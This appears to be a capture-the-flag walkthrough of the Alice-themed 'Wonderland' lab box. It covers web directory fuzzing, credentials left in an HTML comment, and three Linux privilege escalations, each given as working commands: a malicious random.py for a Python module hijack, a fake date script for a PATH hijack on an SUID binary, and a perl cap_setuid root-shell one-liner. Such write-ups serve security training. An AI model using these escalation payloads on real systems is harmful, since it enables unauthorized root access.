Wonderland

Medium linux python-hijack path-hijack capabilities

An Alice-in-Wonderland themed box that chains three distinct privilege escalation techniques back to back: a Python module hijack through sudo, a PATH hijack on an SUID binary, and finally Linux capabilities on perl. A small textbook of Linux post-exploitation.

01 Reconnaissance

nmap -sC -sV -p- -T4 10.10.X.X -oN nmap.txt
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Follow the White Rabbit.

Two ports. The web page at port 80 just says "Follow the White Rabbit." with a small rabbit icon. Viewing the source doesn't reveal much, so fuzz for directories:

gobuster dir -u http://10.10.X.X/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 40 -x html,php,txt -o gobuster.txt

/r shows up. Visiting /r gives another hint and the word "rabbit". The trick here is that each letter of rabbit is a directory:

02 Down the rabbit hole

Walk the path manually:

/r  →  /r/a  →  /r/a/b  →  /r/a/b/b  →  /r/a/b/b/i  →  /r/a/b/b/i/t

The final page shows an Alice quote. View the HTML source:

curl http://10.10.X.X/r/a/b/b/i/t/ | less
<!--
Don't forget to collect the key. alice:HowDothTheLittleCrocodileImproveHisShiningTail
-->

Credentials: alice : HowDothTheLittleCrocodileImproveHisShiningTail. Straight into SSH:

ssh alice@10.10.X.X

03 alice → rabbit (Python module hijack)

Look around alice's home:

ls -la
-r-------- 1 root  root   66 root.txt
-rwxr-xr-x 1 root  root  225 walrus_and_the_carpenter.py

Note that root.txt here is not alice's flag — it's a decoy owned by root. The actual user flag is hiding elsewhere in the chain. Check sudo rights:

sudo -l
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

alice can run that one Python script as rabbit. Read it:

cat walrus_and_the_carpenter.py
import random
poem = """The sun was shining on the sea,...
..."""
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was: ", line)

The script imports random. Python's import lookup checks the script's own directory first, so any random.py sitting next to walrus_and_the_carpenter.py takes priority over the standard library. Classic module hijack.

alice doesn't own that directory, but /home/alice is world-writable on this box (check with ls -ld /home/alice) — which is what makes the hijack possible. If it weren't, we'd have to drop random.py somewhere on PYTHONPATH.

Drop a malicious random.py:

cat > /home/alice/random.py <<'EOF'
import os
os.system("/bin/bash -p")
EOF

Now run the sudo command:

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
# id → uid=1002(rabbit) ...

Shell as rabbit. Collect the user flag:

cat /home/rabbit/user.txt    # or /root/user.txt depending on version — see below
On Wonderland the flags are deliberately shuffled between users' home directories — root.txt sometimes lives in alice's home (but needs root to read), user.txt in /root/, etc. Just cat each flag file you encounter as you escalate; the theme is "nothing is where you expect".

04 rabbit → hatter (PATH hijack)

Enumerate rabbit's home:

cd /home/rabbit && ls -la
-rwsr-sr-x 1 hatter hatter 16816 teaParty

SUID binary owned by hatter. Poke at it:

./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Tue, 15 Sep 2026 17:41:13 +0000
Ask very nicely, and I will give you some tea while you wait for him

The date string is the giveaway — it's calling out to date. Confirm with strings:

strings /home/rabbit/teaParty | grep -Ei "date|echo|bash"
/bin/echo -n 'Probably by '
date --date='next hour' -R
Ask very nicely, and I will...

Actually it calls date without a full path (despite the strings output showing /bin/echo, the date call is relative — verify by running ltrace ./teaParty if available, or just try the hijack). That means we can put a malicious date earlier in PATH:

cd /tmp
cat > date <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x date
export PATH=/tmp:$PATH
/home/rabbit/teaParty
# id → uid=1003(hatter) ...

Shell as hatter. Spawn a proper TTY if you haven't already.

05 hatter → root (perl capability)

Inside hatter's home:

cat /home/hatter/password.txt
WhyIsARavenLikeAWritingDesk?

If you only pivoted via teaParty (not a full SSH session), log in properly with this password so you have a clean environment:

ssh hatter@10.10.X.X

Now check Linux capabilities — a recurring privesc vector that sudo -l and SUID checks miss:

getcap -r / 2>/dev/null
/usr/bin/perl = cap_setuid+ep

cap_setuid+ep on perl means any perl script can call setuid(0) and actually transition to root, despite perl not being SUID. Straight from GTFOBins:

/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# id → uid=0(root) gid=1004(hatter) euid=0(root)

Root shell. Grab the final flag:

cat /root/root.txt

06 Wrap-up

Three distinct privesc patterns in a single box, which is what makes Wonderland great practice:

  • Python module hijack — script imports a module, we drop a same-named .py in its directory and it gets loaded first.
  • PATH hijack — SUID binary calls an external command by relative name; we inject /tmp at the front of PATH.
  • Capabilities — cap_setuid on an interpreter = game over. Always run getcap -r /.

The enumeration muscle memory to take away: sudo -l, find / -perm -4000, getcap -r /, and read the scripts you can run before assuming anything.
